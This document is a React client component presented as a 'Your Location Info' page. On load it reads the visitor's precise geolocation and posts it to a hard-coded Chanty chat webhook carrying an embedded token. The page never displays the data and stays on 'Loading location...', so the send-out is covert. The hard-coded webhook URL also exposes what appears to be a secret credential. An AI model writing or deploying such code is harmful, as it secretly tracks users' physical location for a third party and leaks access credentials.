"use client";

import { createClient } from "@/utils/supabase/client";
import { useEffect, useState } from "react";

export default function LocationPage() {
  const [location, setLocation] = useState<any>(null);

  useEffect(() => {
    window.navigator.geolocation.getCurrentPosition(
      (position: GeolocationPosition) => {
        console.log(position, " position");
        try {
          fetch(
            "https://api.chanty.com/hooks/v2/TrO6g4uVssZgt7wqs8YkgEm6PynMtB6b2686FMtu/Dz9FgvtUq77r6dhKZNkU4LpF-DGWX9YzXyvBdURP/GHmh1EIrrUKrigZC6gJtjKZ2khWmjv4U1hXqc6JxWK7uUXW4C7c6oQdRQ6vP3Lcf8S3ZNF11buyIVTF6fJVVMHtuy97fSZLqrrCwrmKL9C4fvmSjoMFV2PPI2PiLngUtkC1ps2nQDm7N2F8rC9Fbzxr9uMVSV-HNtGZvRsjoNigocnEQVxbB9xHUOvV2Gou3dMW8ErIeMrUJCoyYMNoIzeCDE8NcoHiKrZwfFvhehcGkLcTDFWWn4S74JtRHTQTMwSKJUnPtFVDHggjbS1yO4c9i28UwGJmSfzomc6qg3scJcr4B8NE7NNvXZyykY41beQPcjObST4-UJqnNyoBTbv1nnQBEGCTQEJQrsg3MqxZFgsb8Lij34ptMxKfRqv2jI",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                text: `position: ${JSON.stringify(position)}`,
              }),
            }
          ).then((res) => {
            console.log("res => ", res);
          });
        } catch {}
      },
      (positionError: GeolocationPositionError) => {
        console.log(positionError, " positionError");
      }
    );
  }, []);

  if (!location) return <p>Loading location...</p>;

  return (
    <div className="p-4">
      <h2 className="text-xl font-bold mb-2">Your Location Info</h2>
      <p>
        <strong>IP:</strong> {location.ip}
      </p>
      <p>
        <strong>City:</strong> {location.city}
      </p>
      <p>
        <strong>Region:</strong> {location.region}
      </p>
      <p>
        <strong>Country:</strong> {location.country}
      </p>
      <p>
        <strong>Latitude:</strong> {location.latitude}
      </p>
      <p>
        <strong>Longitude:</strong> {location.longitude}
      </p>
    </div>
  );
}
